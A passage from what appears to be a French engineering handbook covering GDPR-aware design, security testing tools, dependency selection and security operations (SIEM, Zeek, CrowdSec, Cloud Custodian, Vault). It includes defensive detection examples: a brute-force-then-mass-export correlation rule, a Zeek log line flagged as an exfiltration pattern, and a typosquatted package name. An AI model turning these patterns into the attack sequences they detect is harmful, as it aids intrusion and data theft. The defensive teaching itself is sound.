| <span class="term" data-term="dpo">DPO</span> (délégué à la protection des données) | la personne chargée de conseiller et de contrôler la conformité dans l'organisation (articles 37 à 39) ; c'est elle qu'on consulte sur un nouveau traitement |
| traitement                         | toute opération sur des données personnelles : collecter, stocker, consulter, envoyer, effacer |
| <span class="term" data-term="processing-register">registre des traitements</span>           | la liste écrite de tous les traitements de l'organisation, avec leur finalité, leurs données, leurs destinataires et leur durée (article 30) |
| <span class="term" data-term="legal-basis">base légale</span>                        | la raison juridique qui autorise un traitement (article 6) : consentement, contrat, obligation légale, intérêts vitaux, mission d'intérêt public ou intérêt légitime. Sans base légale, le traitement est interdit |
| décision d'adéquation              | décision de la Commission européenne qui reconnaît qu'un pays hors UE protège suffisamment les données : les transferts vers lui sont libres |
| <span class="term" data-term="standard-contractual-clauses">clauses contractuelles types</span> (CCT) | un contrat modèle publié par la Commission européenne (version de juin 2021), signé avec un fournisseur hors UE pour encadrer un transfert vers un pays sans décision d'adéquation |

Une entrée du registre, en exemple :
```
traitement : gestion des commandes  | finalité : livrer et facturer       | base légale : contrat (art. 6.1.b)
données    : nom, adresse, e-mail   | destinataires : orders-service, billing-service, transporteur
durée      : 10 ans après la commande (comptabilité, à vérifier par pays) | transferts hors UE : aucun
```

### Les décisions de conception
| Principe                          | Ce qu'il veut dire                                                       | Décision d'architecture                                     |
|-----------------------------------|--------------------------------------------------------------------------|-------------------------------------------------------------|
| minimisation (art. 5)             | ne collecter que ce qui sert la finalité annoncée                        | pas de date de naissance si l'âge n'est jamais utilisé       |
| pseudonymisation (art. 4 et 25)   | remplacer l'identité par un identifiant, la correspondance gardée à part | les données personnelles dans customers-service, les autres services ne voient que `customer_id` |
| durée de conservation (art. 5)    | chaque donnée a une date de fin                                          | purge automatique, rétention des logs et des topics réglée  |
| droits des personnes (art. 15 à 22) | accès, rectification, effacement, portabilité                          | une procédure d'effacement qui couvre bases, logs, événements et sauvegardes |
| transferts hors UE (chapitre V)   | les données ne quittent l'UE que dans des cas encadrés                   | choix des régions d'hébergement et des fournisseurs         |

La <span class="term" data-term="data-minimization">minimisation</span> est la mesure la plus rentable : une donnée qu'on n'a pas ne fuit pas, ne se purge pas et ne se transfère pas.

**Risques.** Ne pas appliquer ces principes expose à des sanctions (jusqu'à 4 % du chiffre d'affaires annuel mondial, article 83) et surtout à des fuites plus graves. Les appliquer a aussi un coût : la pseudonymisation oblige à appeler customers-service pour afficher un nom, et une purge mal ciblée efface des données encore nécessaires. Je teste chaque purge sur une copie avant de l'activer.

:material-book-open-variant: Doc de référence : [CEPD, lignes directrices 4/2019 sur l'article 25](https://www.edpb.europa.eu/our-work-tools/our-documents/guidelines/guidelines-42019-article-25-data-protection-design-and_en) (version 2.0, 2020)
{ .doc-ref }

### Pseudonymisation ou anonymisation
La <span class="term" data-term="pseudonymization">pseudonymisation</span> réduit l'exposition, mais les données restent personnelles et le RGPD s'applique entièrement. Seule une vraie <span class="term" data-term="data-anonymization">anonymisation</span>, irréversible, les fait sortir du règlement. La différence, et les quatre façons de réidentifier une donnée « anonyme », sont détaillées dans la page [IA en entreprise](ia-entreprise.md#pourquoi-le-mode-anonyme-est-en-realite-de-la-pseudonymisation).

!!! noob "As noob"
    Pseudonymiser, c'est remplacer les noms par des numéros de dossier en gardant quelque part la liste qui relie numéros et noms : avec la liste, on retrouve la personne. Anonymiser, c'est détruire tout moyen de la retrouver, y compris en croisant avec d'autres données. La phrase à retenir : **si quelqu'un peut encore retrouver la personne, c'est de la pseudonymisation, et le RGPD s'applique.**

### Durée de conservation
Chaque champ personnel a une finalité et une <span class="term" data-term="retention-period">durée de conservation</span>, écrites dans le registre des traitements. Les copies oubliées sont le piège : logs applicatifs, topics Kafka à <span class="term" data-term="message-retention">rétention</span> illimitée, exports dans un entrepôt de données, environnements de test alimentés avec des données de production.

```
donnée                       durée (exemple)             mécanisme
compte client actif          tant que le compte existe   suppression à la clôture
commande                     10 ans (obligation comptable, à vérifier par pays)  archivage puis purge
logs applicatifs             30 jours                    rétention de l'outil de logs, pas d'e-mail dans les logs
topic order.created          7 jours                     retention.ms du topic
```

### Droit à l'effacement et journaux d'événements
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Le <span class="term" data-term="right-to-erasure">droit à l'effacement</span> (article 17) est simple dans une base, difficile dans un <span class="term" data-term="event-log">journal d'événements</span> immuable ou une sauvegarde : on ne réécrit pas un événement publié il y a six mois.

Le <span class="term" data-term="crypto-shredding">crypto-shredding</span> répond à ce cas : les champs personnels de chaque client sont chiffrés avec **sa propre clé**, stockée dans un <span class="term" data-term="kms">service de gestion de clés</span>. Effacer le client revient à détruire sa clé.

!!! noob "As noob"
    Mes données personnelles sont rangées dans un coffre, et ce coffre est recopié dans des archives qu'on ne peut pas modifier. Plutôt que de fouiller toutes les archives, on détruit la seule clé du coffre : les copies restent, mais plus personne ne peut les ouvrir. Limite : tout dépend de la destruction réelle de la clé, y compris dans ses sauvegardes. La phrase à retenir : **effacer, ici, c'est jeter la clé.**

```
événement order.created dans Kafka
{ "order_id": "42", "customer_id": "cust-ada", "personal_data": "gAAAAABl...(chiffré avec la clé de cust-ada)" }

ada demande l'effacement   : la clé de cust-ada est détruite
rejeu six mois plus tard   : order_id et customer_id lisibles, personal_data illisible partout
```

Deux limites : une clé restaurée depuis une vieille sauvegarde annule l'effacement, et la valeur juridique de cette méthode comme effacement reste débattue (à vérifier avec le DPO). Le mieux reste de ne pas mettre de données personnelles dans les événements : ne publier que `customer_id`.

### Résidence des données
La <span class="term" data-term="data-residency">résidence des données</span> est la contrainte sur le pays ou la région où les données sont stockées **et traitées**. Un transfert hors UE n'est possible qu'avec une base légale (décision d'adéquation, clauses contractuelles types). Conséquences concrètes : choisir une région européenne chez le fournisseur cloud, vérifier où tournent les services managés annexes (logs, support, IA), et lister les sous-traitants. Le cadre des transferts vers les États-Unis a changé plusieurs fois (arrêt Schrems II en 2020, Data Privacy Framework en 2023) : à vérifier au moment de décider.

Pour un traitement à risque élevé (données de santé, suivi à grande échelle), une <span class="term" data-term="dpia">analyse d'impact (AIPD)</span> est obligatoire avant de le lancer (article 35).

:material-book-open-variant: Doc de référence : [Commission européenne, décisions d'adéquation](https://commission.europa.eu/law/law-topic/data-protection/international-dimension-data-protection/adequacy-decisions_en) (consultée en novembre 2026)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | le registre des traitements existe, tenu par le DPO, et les équipes le découvrent au premier audit |
    | N2 | chaque nouveau champ personnel passe par une revue (finalité, durée, base légale), et les durées de conservation sont réglées dans les bases, les logs et les topics |
    | N3 | les purges tournent seules, une demande d'effacement passe par un outil qui couvre bases, logs et événements, et un test vérifie qu'aucun e-mail n'apparaît dans les logs |
    | N4 | l'équipe suit le délai de traitement des demandes d'accès et d'effacement et le volume de données personnelles par service, et minimise d'après ces chiffres |

    **Je mesure** : le délai médian de traitement d'une demande d'effacement, lu dans le suivi des demandes (le RGPD fixe un mois en règle générale) ; le nombre de champs personnels sans durée de conservation, lu dans le registre.

## Les outils de test de sécurité

<a class="pill pill-scope pill-scope-code" href="../architecture/#carte-des-echelles">Échelle · Code</a> <a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a>

<a class="pill pill-dora" href="https://dora.dev/capabilities/pervasive-security/">DORA · Pervasive security</a>


| Outil                    | Ce qu'il fait                                                  | Exemple                                  |
|--------------------------|----------------------------------------------------------------|------------------------------------------|
| SAST                     | analyse le code source sans l'exécuter                         | détecte une requête SQL construite par concaténation |
| scan de dépendances      | cherche les failles connues dans les bibliothèques utilisées  | « la version 2.3 de cette lib a une faille critique » |
| scan de secrets          | cherche des clés et mots de passe dans le code et l'historique | gitleaks                                 |
| DAST                     | attaque l'application qui tourne, de l'extérieur               | OWASP ZAP sur l'environnement d'intégration |
| test d'intrusion         | une personne spécialisée cherche des failles à la main        | avant une mise en production sensible    |

Chaque outil tourne là où il est le moins cher de corriger ce qu'il trouve : le plus tôt possible pour ce qui se voit dans le code, sur l'application qui tourne pour le reste.

```mermaid
flowchart LR
  DEV["Poste du développeur<br/>hook pre-commit"] --> MR["Merge request<br/>CI"]
  MR --> BUILD["Build<br/>image"]
  BUILD --> INT["Environnement<br/>d'intégration"]
  INT --> PROD["Production"]
  DEV -.- K1["scan de secrets"]
  MR -.- K2["SAST, scan de dépendances,<br/>scan de secrets"]
  BUILD -.- K3["scan de l'image<br/>conteneur"]
  INT -.- K4["DAST"]
  PROD -.- K5["test d'intrusion,<br/>nouvelles CVE sur ce qui tourne"]
```

:material-book-open-variant: Doc de référence : [OWASP, Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) (consultée en novembre 2026)
{ .doc-ref }

### Exemple : un scan de dépendances
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Le scan compare les versions installées à une base de failles publiées (identifiants CVE ou GHSA). En Python avec `pip-audit` (en JavaScript, `npm audit` fait la même chose) :
```
$ pip-audit -r requirements.txt
Found 1 known vulnerability in 1 package
Name     Version ID                  Fix Versions
-------- ------- ------------------- ------------
requests 2.31.0  GHSA-9wx4-h78v-vm56 2.32.0
```
Lecture : `requests` 2.31.0 a une faille connue, corrigée en 2.32.0 (sortie illustrative, à vérifier). En CI, la commande renvoie un code d'erreur quand elle trouve une faille, ce qui bloque le pipeline ; un outil comme Renovate ouvre ensuite la mise à jour.

*Renovate : concurrent de Dependabot ; complémentaire de Snyk, Trivy*
{ .tool-rel }


**Risques.** Un scan qui bloque le pipeline sur toute faille connue, même sans correctif disponible, bloque aussi les livraisons urgentes, et l'équipe finit par désactiver le contrôle. Je bloque sur les failles critiques qui ont un correctif, et je trace les autres comme risques acceptés avec une date de revue. Un scan ne voit que les failles déjà publiées : une dépendance piégée publiée la veille passe.

:material-book-open-variant: Doc de référence : [pip-audit](https://github.com/pypa/pip-audit) (consultée en novembre 2026)
{ .doc-ref }

### Choisir une dépendance
<a class="pill pill-scope pill-scope-code" href="../architecture/#carte-des-echelles">Échelle · Code</a> <a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a> <span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Le scan trouve les failles des bibliothèques déjà installées. Le meilleur moment pour réduire le risque, c'est avant : chaque <span class="term" data-term="dependency-software">dépendance</span> est du code que je n'ai pas écrit, que je dois mettre à jour, et qui peut contenir une faille ou être abandonné. Je dois générer les PDF des factures : la bibliothèque la plus populaire, une plus légère maintenue par une seule personne, ou un service SaaS payant ?

Ma grille, dans l'ordre :

1. **En ai-je besoin ?** Pour trois lignes de code, je ne l'ajoute pas.
2. **Les dépendances qu'elle apporte.** Une <span class="term" data-term="transitive-dependency">dépendance transitive</span> est une dépendance de ma dépendance, que je n'ai pas choisie mais que j'expédie quand même. Je les compte avant d'ajouter (`npm ls --all`, `pipdeptree`, `uv tree`) : une bibliothèque de PDF qui embarque un navigateur entier alourdit l'image et multiplie les failles possibles.
3. **La <span class="term" data-term="software-license">licence</span>.** Permissive (MIT, Apache-2.0, BSD) : utilisable dans un produit fermé, en gardant la mention. Copyleft (GPL) : si je distribue le logiciel, je dois publier mon code sous la même licence ; l'AGPL étend cette obligation à un service accessible par le réseau. Pas de licence du tout : tous droits réservés, donc je ne peux pas l'utiliser. Je vérifie aussi les licences des dépendances transitives (un outil SCA le fait).
4. **Les signes de maintenance.** Date de la dernière version, nombre de mainteneurs actifs (un seul, c'est un risque d'abandon), délai de correction des failles signalées, tickets sans réponse, politique de sécurité publiée.
5. **Le nom exact.** Un paquet au nom presque identique (`reqeusts` au lieu de `requests`) peut être un piège publié par un attaquant : je copie le nom depuis la documentation officielle.

L'**OpenSSF Scorecard** (Open Source Security Foundation, lancé en 2020) automatise le point 4 : il note de 0 à 10 des vérifications sur le dépôt (projet maintenu, revue de code, protection de branche, dépendances épinglées, failles connues, versions signées, workflows CI dangereux). Les notes sont visibles sur deps.dev, ou en ligne de commande (un jeton GitHub est demandé) :

```
$ scorecard --repo=github.com/example-org/pdf-lib
Aggregate score: 6.8 / 10
CHECK                 SCORE  REASON
Maintained            10     30 commit(s) and 12 issue activity found in the last 90 days
Code-Review           8      Found 24/30 approved changesets
Pinned-Dependencies   3      dependency not pinned by hash detected
Vulnerabilities       10     0 existing vulnerabilities detected
```

Sortie illustrative, dépôt fictif : noms des vérifications et format à vérifier sur la version installée. Un score bas n'interdit pas une bibliothèque, il dit quoi regarder.

Une fois choisie, si la bibliothèque est au cœur du métier, je l'isole derrière une petite interface à moi (*Adapter*, ou « Don't mock what you don't own », Steve Freeman et Nat Pryce, 2009) :

```python
# À éviter : la bibliothèque appelée dans tout le code, en changer oblige à toucher chaque fichier
pdf = pdflib.Document(page_size="A4")
pdf.add_text(invoice.customer_name)

# Bien : une interface à moi, que le reste du code utilise
class InvoiceRenderer(Protocol):
    def render(self, invoice: Invoice) -> bytes: ...


# Bien : la seule classe qui connaît la bibliothèque, remplaçable sans toucher au reste
class PdfLibInvoiceRenderer:
    def render(self, invoice: Invoice) -> bytes:
        pdf = pdflib.Document(page_size="A4")
        pdf.add_text(invoice.customer_name)
        return pdf.to_bytes()
```

Si la bibliothèque est abandonnée un jour, j'écris un autre `InvoiceRenderer`, et le test qui génère une facture et vérifie le texte du PDF me dit si le remplacement est fidèle.

**Quand** : à chaque ajout, et à la revue d'une MR qui modifie `package.json` ou `pyproject.toml`. **Pourquoi** : moins de failles, pas de surprise juridique, et la liberté de changer plus tard. **Comment** : la grille ci-dessus, la version fixée dans le <span class="term" data-term="lockfile">lockfile</span>, puis un <span class="term" data-term="dependency-update-bot">robot de mise à jour</span> comme Renovate pour proposer les nouvelles versions, testées par la CI.

**Risques.** Fixer les versions dans le lockfile sans robot de mise à jour fige les failles : dans un an, la version choisie avec soin sera la plus vulnérable. À l'inverse, fusionner chaque mise à jour automatiquement fait entrer une version piégée le jour de sa publication : je laisse la CI tester, et j'attends quelques jours avant de fusionner une version toute neuve (réglage `minimumReleaseAge` de Renovate, à vérifier).

:material-book-open-variant: Doc de référence : [OpenSSF Scorecard](https://scorecard.dev/) (consultée en novembre 2026) ; [choosealicense.com, Licenses](https://choosealicense.com/licenses/) (consultée en novembre 2026)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | un scan de dépendances est lancé à la main avant une livraison importante |
    | N2 | SAST, scan de dépendances et scan de secrets tournent à chaque MR, le DAST sur l'environnement d'intégration, et un robot propose les mises à jour |
    | N3 | un nouveau constat critique bloque seul la MR, et chaque nouvelle dépendance passe la grille (licence, maintenance, Scorecard) en revue |
    | N4 | l'équipe suit les failles ouvertes par gravité et leur délai de correction, et règle ses seuils de blocage d'après ces chiffres |

    **Je mesure** : le délai médian entre la publication d'une CVE critique qui touche une dépendance et son correctif en production, lu dans l'outil SCA ; la part des dépôts où les scans tournent, lue dans la configuration de la CI.

## Opérations de sécurité

<a class="pill pill-scope pill-scope-infra" href="../architecture/#carte-des-echelles">Échelle · Infrastructure</a> <a class="pill pill-scope pill-scope-enterprise" href="../architecture/#carte-des-echelles">Échelle · Entreprise</a>

<a class="pill pill-dora" href="https://dora.dev/capabilities/pervasive-security/">DORA · Pervasive security</a>

!!! info "Section rédigée en novembre 2026"
    Les produits de sécurité changent vite de nom, de périmètre et de modèle de prix. Les noms cités sont des exemples, pas des recommandations, et leurs fonctions sont à vérifier au moment de la lecture.

Les sections précédentes parlent de ce qu'on met **dans** le code. Celle-ci parle des outils qui tournent **autour** : ils surveillent ce qui se passe en production, vérifient la configuration du cloud et gardent les secrets. La plupart sont tenus par une équipe sécurité ou plateforme ; les équipes de développement les alimentent (journaux, politiques, corrections) et reçoivent leurs alertes.

| Famille | La question à laquelle elle répond | Qui la regarde au quotidien | Exemples |
|---|---|---|---|
| SIEM | que s'est-il passé, sur tous les systèmes à la fois ? | équipe sécurité, <span class="term" data-term="soc">SOC</span> | Splunk, Microsoft Sentinel, Elastic Security, Google SecOps |
| NDR | qui parle à qui sur le réseau, et est-ce normal ? | équipe sécurité, équipe réseau | Darktrace, Corelight, Zeek, Suricata |
| IPS collaboratif | cette adresse IP attaque-t-elle déjà quelqu'un ailleurs ? | équipe plateforme, administrateurs | CrowdSec, fail2ban (local seulement) |
| CSPM et gouvernance cloud | la configuration du cloud respecte-t-elle nos règles ? | équipe plateforme, FinOps, sécurité | Cloud Custodian, Steampipe, Wiz, Security Command Center |
| gestionnaire de secrets | où vivent les mots de passe, et qui les lit ? | applications, CI, humains | HashiCorp Vault, gestionnaire du cloud, 1Password, Bitwarden |
| plateforme SAST et SCA | quelles failles connues sont dans notre code et nos dépendances ? | équipes de développement | SonarQube, Semgrep, Snyk, Aikido |

### SIEM : centraliser et corréler les journaux de sécurité
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Un <span class="term" data-term="siem">SIEM</span> (*Security Information and Event Management*) collecte les journaux de sécurité de tous les systèmes (connexions, changements de droits, pare-feu, cloud, postes de travail), les range dans un format commun et applique des **règles de corrélation** : des motifs qu'aucun journal ne montre seul.

!!! noob "As noob"
    Chaque journal est une caméra qui ne filme qu'une porte. Le SIEM, c'est le poste de sécurité qui regarde tous les écrans à la fois et remarque qu'un même badge a servi à Paris, puis à Singapour dix minutes plus tard. La phrase à retenir : **le SIEM trouve, en croisant les journaux, ce qu'aucun ne montre seul.**

**Quand** : plusieurs équipes, plusieurs clouds ou une obligation réglementaire (conservation des journaux, détection d'intrusion, normes comme ISO 27001) ; quelqu'un est payé pour regarder les alertes. **Pas encore** : une petite équipe sans personne pour trier les alertes. Commencer alors par les journaux d'audit du cloud et trois ou quatre alertes bien choisies.

**Pourquoi** : une attaque laisse des traces dispersées. Un échec de connexion sur my-api, un nouveau jeton créé, un téléchargement massif depuis un bucket : chaque fait est banal, leur enchaînement en dix minutes ne l'est pas. Le coût : une facture souvent au volume ingéré, des règles à maintenir, et des <span class="term" data-term="false-positive">faux positifs</span> qui fatiguent l'équipe.

**Comment**, côté développement :

1. émettre des journaux de sécurité structurés : qui (`user_id`), quoi (`event`), d'où (`ip`), résultat ; jamais de secret ni de mot de passe ;
2. les envoyer vers le même collecteur que les autres journaux, avec un champ qui les distingue ;
3. écrire avec l'équipe sécurité les deux ou trois règles propres au métier (un remboursement au-dessus d'un seuil, un export de toute la base client).

```
10:02:11  my-api  login_failed   user=ada  ip=203.0.113.7
10:02:14  my-api  login_failed   user=ada  ip=203.0.113.7
   ... 38 échecs en 2 minutes
10:04:03  my-api  login_success  user=ada  ip=203.0.113.7
10:06:40  my-api  export_orders  user=ada  rows=184000

règle : plus de 20 échecs puis un succès depuis la même IP, suivi d'un export
        dans les 15 minutes : alerte SEV2 vers l'équipe sécurité
```

Les règles peuvent s'écrire dans un format neutre, Sigma (projet ouvert lancé en 2017, à vérifier), puis être traduites pour le SIEM utilisé. Les adresses IP de l'exemple sont réservées à la documentation (RFC 5737, 2010).

:material-book-open-variant: Doc de référence : [NIST SP 800-92, Guide to Computer Security Log Management](https://csrc.nist.gov/pubs/sp/800/92/final) (2006) ; [Sigma](https://github.com/SigmaHQ/sigma) (consultée en novembre 2026)
{ .doc-ref }

### Détection réseau (NDR)
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Un <span class="term" data-term="ndr">NDR</span> (*Network Detection and Response*) analyse le trafic réseau lui-même, à partir d'une copie de ce trafic (port miroir, *packet mirroring* du cloud), au lieu des journaux que les applications veulent bien écrire.

**Quand** : un réseau avec beaucoup de machines qu'on ne contrôle pas finement (postes, objets connectés, serveurs anciens), un centre de données, une obligation de détecter les mouvements latéraux. **Pas encore** : une application entièrement managée ou serverless, où il y a peu de réseau à soi à observer ; les journaux du cloud (*VPC flow logs*) suffisent souvent.

**Pourquoi** : un attaquant qui est entré ne s'annonce pas dans les journaux applicatifs, mais il doit parler sur le réseau : scanner les voisins, contacter son serveur de commande à intervalles réguliers, sortir des données. Le coût : du matériel ou des capteurs, beaucoup de volume, et une vision limitée dans le trafic chiffré (on voit qui parle à qui, combien et quand, pas le contenu).

**Comment** : deux approches qui se combinent.

- **Signatures** : Suricata (open source) reconnaît des attaques connues, comme un antivirus réseau.
- **Comportement** : Darktrace (commercial) apprend ce qui est normal pour chaque machine et signale l'écart ; Corelight (commercial) s'appuie sur Zeek, un moteur open source qui transforme le trafic en journaux lisibles.

Une ligne de `conn.log` produite par Zeek, simplifiée :
```
ts          id.orig_h   id.resp_h      id.resp_p  proto  duration  orig_bytes  resp_bytes
1730714400  10.0.4.12   198.51.100.20  443        tcp    3600.2    2147483648  5120
```
Lecture : une machine interne a envoyé 2 Gio vers une adresse externe pendant une heure, et n'a presque rien reçu en retour. Ce n'est pas forcément une attaque (une sauvegarde ?), mais c'est exactement le motif d'une exfiltration. Champs et format à vérifier selon la version de Zeek.

:material-book-open-variant: Doc de référence : [Zeek, documentation](https://docs.zeek.org/) (consultée en novembre 2026) ; [Suricata, documentation](https://docs.suricata.io/) (consultée en novembre 2026)
{ .doc-ref }

### IPS collaboratif : CrowdSec
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Un <span class="term" data-term="ips">IPS</span> (*Intrusion Prevention System*) détecte une attaque **et la bloque**, là où un IDS se contente de la signaler. CrowdSec (open source, société française, lancé en 2020, à vérifier) ajoute une dimension collective : chaque installation partage les adresses qu'elle bloque, et reçoit en retour une liste d'adresses déjà vues en train d'attaquer ailleurs.

**Quand** : un service exposé sur internet qui subit du bruit (force brute sur une page de connexion, scans, robots qui testent des chemins `/wp-admin`), surtout sur des serveurs qu'on gère soi-même. **Pas encore**, ou avec prudence : des clients derrière des adresses partagées (réseaux d'entreprise, opérateurs mobiles), où bloquer une IP bloque des centaines de vrais utilisateurs.

**Pourquoi** : la <span class="term" data-term="rate-limit">limitation de débit</span> ralentit un attaquant, elle ne l'arrête pas, et elle ne sait rien de ce qu'il a fait ailleurs. Le gain : les attaquants connus sont bloqués avant leur première tentative. Le coût : des faux positifs, et le partage des adresses observées avec le service central (à vérifier dans les conditions du service).

**Comment** : l'agent lit des journaux (nginx, SSH), applique des **scénarios** (« 10 échecs de connexion en 1 minute »), prend une **décision** (bannir 4 h) ; des **bouncers** appliquent la décision au bon endroit (pare-feu, nginx, <span class="term" data-term="cdn">CDN</span>).

*nginx : concurrent de Caddy, Traefik, Envoy ; complémentaire de KrakenD*
{ .tool-rel }


```
$ cscli decisions list
 ID  Source    Scope:Value       Reason                          Action  Duration
 12  crowdsec  Ip:203.0.113.7    crowdsecurity/http-bf-wordpress  ban     3h52m
 13  CAPI      Ip:198.51.100.9   crowdsecurity/ssh-bf             ban     166h
```
La première décision vient de l'agent local, la seconde de la liste communautaire. Sortie illustrative, colonnes à vérifier selon la version.

:material-book-open-variant: Doc de référence : [CrowdSec, documentation](https://docs.crowdsec.net/) (consultée en novembre 2026)
{ .doc-ref }

### CSPM et gouvernance cloud en code
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Le <span class="term" data-term="cspm">CSPM</span> (*Cloud Security Posture Management*) vérifie en continu la configuration réelle du cloud contre des règles : bucket public, disque non chiffré, port SSH ouvert à tout internet, compte de service avec des droits d'administration.

**Quand** : plusieurs comptes ou projets cloud, plusieurs équipes qui créent des ressources, des changements faits à la main dans la console. **Pas encore** : un seul projet entièrement géré en <span class="term" data-term="infrastructure-as-code">infrastructure as code</span> et relu en revue ; un scan du code Terraform (Checkov, Trivy) suffit au début.

*Terraform : concurrent de OpenTofu, Pulumi ; concurrent en partie de Crossplane ; complémentaire de Terragrunt, Packer, Ansible*<br>
*Trivy : concurrent en partie de Snyk ; complémentaire de Renovate*
{ .tool-rel }


**Pourquoi** : le scan du code d'infrastructure voit ce qu'on **voulait** déployer ; le CSPM voit ce qui **existe**, clics dans la console compris. Le coût : beaucoup de constats au premier passage, à trier par risque, et des actions automatiques qui peuvent casser un usage légitime.

**Comment** : trois familles d'outils.

| Outil | Ce qu'il fait | Quand le choisir |
|---|---|---|
| CSPM commercial (Wiz, Prisma Cloud) ou intégré au cloud (Security Command Center, AWS Security Hub, Defender for Cloud) | règles prêtes à l'emploi, score de risque, tableau de bord | besoin d'une vue complète vite, budget disponible |
| Cloud Custodian | des politiques en YAML qui filtrent des ressources et agissent dessus | des règles propres à l'organisation, avec correction automatique |
| Steampipe | interroge les API du cloud en SQL, comme si chaque type de ressource était une table | inventaire, questions ponctuelles, rapports |

Cloud Custodian (projet de la CNCF, à vérifier pour son statut) applique de la <span class="term" data-term="policy-as-code">politique en code</span>. Exemple pour AWS : retirer l'accès public des buckets, et arrêter dans 3 jours les machines sans étiquette `team`.
```yaml
policies:
  # Exemple : retire l'accès public des buckets S3
  - name: s3-no-public-grants
    resource: aws.s3
    filters:
      - type: global-grants
    actions:
      - type: delete-global-grants

  # Exemple : arrête sous 3 jours les machines sans étiquette team
  - name: ec2-missing-team-tag
    resource: aws.ec2
    filters:
      - "tag:team": absent
    actions:
      - type: mark-for-op
        op: stop
        days: 3
```
```bash
custodian run --dryrun -s out/ policies.yml
```
`--dryrun` liste les ressources visées sans agir : toujours commencer par là, puis passer en mode notification, puis seulement en correction automatique (syntaxe des filtres à vérifier dans la documentation).

Steampipe fait de l'<span class="term" data-term="cloud-asset-inventory">inventaire des ressources cloud</span> en SQL : chaque plugin (AWS, Google Cloud, Kubernetes, GitHub) expose ses ressources comme des tables PostgreSQL, interrogées en direct par les API.

*PostgreSQL : concurrent de MySQL, MariaDB ; concurrent en partie de MongoDB ; complémentaire de Redis, PgBouncer, BigQuery, Elasticsearch*<br>
*Kubernetes : concurrent de Cloud Run ; complémentaire de Docker, Helm, Argo CD*
{ .tool-rel }

```sql
-- Exemple : liste les buckets S3 publics
SELECT name, region, versioning_enabled
FROM aws_s3_bucket
WHERE bucket_policy_is_public;
```
```
 name               | region    | versioning_enabled
--------------------+-----------+-------------------
 my-test-reports    | eu-west-3 | false
```
Utile pour répondre vite à « quels buckets sont publics ? » sans écrire de script, et pour joindre plusieurs sources (les comptes de service d'un projet et les dépôts de code qui les utilisent). Noms de tables et de colonnes à vérifier selon la version du plugin. Les inventaires natifs du cloud (Cloud Asset Inventory chez Google, AWS Config) répondent à la même question sans outil en plus.

Les étiquettes imposées ici servent aussi au suivi des coûts : voir [Coûts et économies](donnees-decision.md#couts-et-economies).

:material-book-open-variant: Doc de référence : [Cloud Custodian, documentation](https://cloudcustodian.io/docs/) (consultée en novembre 2026) ; [Steampipe, documentation](https://steampipe.io/docs) (consultée en novembre 2026)
{ .doc-ref }

### Gestionnaires de secrets : pour les machines et pour les humains
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Les règles de base sont dans [Les secrets](#les-secrets), et la présentation de Vault dans le [panorama des outils](outils.md). Ce qui change à l'échelle d'une organisation : séparer les secrets des **machines** de ceux des **humains**.

*Vault : concurrent de les gestionnaires de secrets des clouds*
{ .tool-rel }


| | Gestionnaire de secrets applicatif | Gestionnaire de mots de passe |
|---|---|---|
| pour qui | applications, CI, scripts | personnes |
| exemples | HashiCorp Vault, OpenBao (fork open source), Google Secret Manager, AWS Secrets Manager | 1Password, Bitwarden, Keeper |
| comment on s'authentifie | identité de la plateforme (compte de service, OIDC de la CI) | SSO de l'entreprise et MFA |
| ce qu'il sait faire de plus | <span class="term" data-term="dynamic-secret">secrets dynamiques</span>, rotation, journal d'audit par application | coffres partagés par équipe, partage temporaire, alerte de fuite |

**Quand** : un <span class="term" data-term="secret-manager">gestionnaire de secrets</span> applicatif dès qu'un secret est lu par du code ; un <span class="term" data-term="password-manager">gestionnaire de mots de passe</span> dès que des personnes partagent un accès (console d'un fournisseur, compte de démonstration). **Pas** : un gestionnaire de mots de passe humain comme source des secrets de production, sauf avec ses comptes de service prévus pour cela (fonction à vérifier selon le produit).

**Pourquoi** : un secret copié dans un fichier `.env`, un ticket ou un message ne se révoque plus proprement ; personne ne sait qui l'a. Un gestionnaire dit qui a lu quoi et quand, et permet de changer le secret en un seul endroit. Le coût : une dépendance critique de plus (s'il tombe, les applications qui démarrent n'ont plus leurs secrets) et une façon de s'authentifier auprès de lui sans créer un nouveau secret à cacher.

**Comment** : l'application s'authentifie avec son <span class="term" data-term="workload-identity">identité de charge de travail</span> (voir [Zero trust](#zero-trust-et-identite-entre-services)), puis demande un secret dynamique : un compte de base créé pour elle, qui expire seul.
```
$ vault read database/creds/my-api-readonly
Key                Value
---                -----
lease_id           database/creds/my-api-readonly/Xy12...
lease_duration     1h
username           v-my-api-readonly-8f3k2
password           A1b2-C3d4-...
```
Volé, ce compte ne sert qu'une heure, et la révocation du bail le supprime de la base. Côté humain, la CLI de 1Password lit un secret par une référence, sans le copier dans un fichier :
```bash
op read "op://team-core/my-api-staging-db/password"
```
(Sorties et syntaxes à vérifier selon les versions.)

:material-book-open-variant: Doc de référence : [HashiCorp Vault, Database secrets engine](https://developer.hashicorp.com/vault/docs/secrets/databases) (consultée en novembre 2026)
{ .doc-ref }

### Plateformes SAST et SCA
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

